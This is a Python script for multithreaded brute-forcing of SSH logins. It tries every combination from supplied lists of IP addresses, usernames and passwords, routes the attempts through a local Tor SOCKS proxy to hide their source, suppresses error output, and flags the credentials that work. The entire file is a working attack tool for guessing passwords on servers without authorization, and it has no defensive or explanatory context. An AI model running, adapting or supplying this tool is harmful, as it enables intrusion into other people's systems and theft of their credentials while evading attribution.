#!/usr/bin/env python3
import paramiko, sys, time, threading, socks, socket
import itertools
from itertools import product

if len(sys.argv) < 4:
    print("Usage: %s ips.txt useres.txt pswds.txt" % (str(sys.argv[0])))
    sys.exit(1)

filename_i=sys.argv[1] ; filename_u=sys.argv[2] ; filename_p=sys.argv[3]

_s = sys.stderr
sys.stderr = open('/dev/null', 'w')

def attempt(ip,UserName,Password):
    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
    socket.socket = socks.socksocket
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    #ssh.banner_timeout = 4
    try:
        ssh.connect(ip, username=UserName, password=Password,timeout=5)
    except paramiko.AuthenticationException:
        print('[-] %s:%s:%s fail!' % (ip,UserName, Password))
    except socket.error:
        print('[-] %s:%s:%s fail!' % (ip,UserName, Password))
    except paramiko.SSHException:
    	print('[-] %s:%s:%s fail!' % (ip,UserName, Password))
    except paramiko.ssh_exception.SSHException:
    	print('[-] %s:%s:%s fail!' % (ip,UserName, Password))
    except SSHException:
    	print('[-] %s:%s:%s fail!' % (ip,UserName, Password))
    except EOFError:
        print('[-] %s:%s:%s fail!' % (ip,UserName, Password))
    else:
        print('[!] %s:%s:%s is CORRECT!' % (ip, UserName, Password))
    ssh.close()
    return

with open(filename_i, 'r') as fd:
    lst1 = [line.strip() for line in fd.readlines()]

with open(filename_u, 'r') as fdd:
    lst2 = [line.strip() for line in fdd.readlines()]

with open(filename_p, 'r') as fddd:
    lst3 = [line.strip() for line in fddd.readlines()]

for ip, username, password in product(lst1, lst2, lst3):
    #print("{} {} {}".format(ip, username, password))
    t = threading.Thread(target=attempt, args=(ip,username,password))
    t.start()
    time.sleep(0.3)

fd.close()
fdd.close()
sys.exit(0)
